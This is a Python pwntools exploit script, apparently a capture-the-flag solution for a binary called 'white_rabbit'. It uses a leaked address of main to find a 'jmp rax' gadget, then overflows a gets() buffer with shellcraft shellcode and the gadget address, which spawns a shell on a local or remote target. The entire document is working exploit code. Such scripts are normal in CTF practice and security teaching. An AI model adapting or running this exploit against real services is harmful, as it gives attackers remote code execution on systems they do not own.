from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './white_rabbit'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

io.recvuntil(b'> ')

main = io.recvuntil(b'\n') #Get the address of main from leak

JMP_RAX = int(main, 16) - 0xc1 #Calculate the address of the jmp rax gadget

payload = asm(shellcraft.sh())        # front of buffer <- RAX points here
payload = payload.ljust(120, b'A')    # pad until RIP
payload += p64(JMP_RAX)               # jump to the buffer - return value of gets()

io.sendline(payload)
io.interactive()
